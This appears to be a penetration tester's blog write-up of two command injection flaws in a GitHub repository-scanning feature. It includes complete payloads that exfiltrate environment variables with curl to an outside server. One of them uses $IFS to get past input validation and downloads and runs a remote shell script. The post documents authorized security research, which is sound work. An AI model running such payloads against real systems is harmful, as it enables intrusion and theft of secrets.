---
title:  "Remote Code Execution with GitHub Feature"
layout: post
date:   2025-06-13
---

Last year, I assessed a popular application used by thousands of organizations and discovered a remote code execution (RCE) vulnerability.

Several months later, I had the opportunity to retest the application and identified a new parameter that bypassed validation, once again resulting in successful code execution.

## Discovering the Vulnerability
A feature in the application allowed users to connect a GitHub repository, which the application would run a daily job to clone and scan the repository. Initially, the clone operation failed due to incorrect access token permissions. The next day, an events endpoint revealed a stack trace detailing the failure, which exposed that an OS-level command was used for cloning. This prompted me to investigate further.

I later discovered that the application's compiled source code was publicly accessible on the vendor's help site. Although the platform is license-restricted, using a decompiler (jadx) to analyze the downloaded code provided the insights I needed.

<figure>
  <img src="/assets/images/2025/stack-trace-disclosing-os-cmd.png">
  <figcaption>Figure 1 – Error disclosed an OS command being run daily to clone a GitHub repository when an access token has missing privileges</figcaption>
</figure>

## Path to Exploitation
By analyzing the full command in the stack trace and reviewing the decompiled code in jadx, I discovered that the branch name parameter was vulnerable to command injection due to a flaw in the input validation logic. The application passed the branch name to a method called **wrapQuotes...**, which only added quotes if the input wasn't already wrapped. If the branch name started and ended with double quotes, the method returned it unmodified—allowing crafted input to bypass validation and break out of the command context. Otherwise, the input would be safely quoted or result in an error.

<figure>
  <img src="/assets/images/2025/bypass-to-rce-sourcecode.png">
  <figcaption>Figure 2 – Highlighted code block is the condition needed for command injection</figcaption>
</figure>

Once I understood the conditions required for successful injection, I crafted a payload that cloned my GitHub repository and executed a **curl** command to exfiltrate environment variables to a server I controlled. The daily job ran the payload early the next morning while I was asleep. After reviewing the results, I documented the vulnerability and prepared the report for the customer.

```
"main" https://github.com/:myGitHubUser/test .; curl -X POST -d "`printenv && ls -la /redacted && ps -aux`" "https://remoteserver.com/"
```

<figure>
  <img src="/assets/images/2025/rce-env-vars.png">
  <figcaption>Figure 3 – Successfully retrieved the server's environment variables</figcaption>
</figure>

## Bypass to Achieve Code Execution Again
Months later, when I had the opportunity to retest the application, I began by reviewing the latest source code to check if the branch name was still vulnerable. I confirmed that proper input validation had been implemented, restricting the allowed characters and preventing the previous injection method. I then explored alternative vectors and identified a field on a different page that allowed users to specify the GitHub repository URL for scanning. Although some input validation was in place, I was eventually able to bypass it after numerous attempts.

The repository URL field enforced input validation that disallowed spaces and required the string to begin with **https**. While researching potential bypass techniques, I came across the Linux shell's Internal Field Separator (IFS) variable, which can be used to substitute spaces in command injection scenarios. After several days of testing—limited by the application's once-daily job execution—I eventually crafted a working payload that successfully bypassed the restrictions and achieved code execution.

```
https://github.com/:myGitHubUser/test;curl$IFS$1-s$IFS$1'https://gist.githubusercontent.com/:myGitHubUser/:uuid/raw/:uuid/test.sh'$IFS$1-o$IFS$1'/tmp/test.sh';/bin/sh$IFS$1/tmp/test.sh$IFS$1Y3VybCAtZCAiYHByaW50ZW52ICYmIGxzIC1sYSAvcmVkYWN0ZWQvZ2xvYmFsLyAmJiBwcyAtYXV4YCIgaHR0cHM6Ly9leGFtcGxlLmNvbQ;echo$IFS$1
```

The payload cloned my repository, executed a **curl** command to download a shell script onto the server, and then ran the script with a base64-encoded input string containing OS commands to be executed on the server.

Following the report submission, the customer implemented proper input validation on the repository URL parameter to remediate the command injection vulnerability.
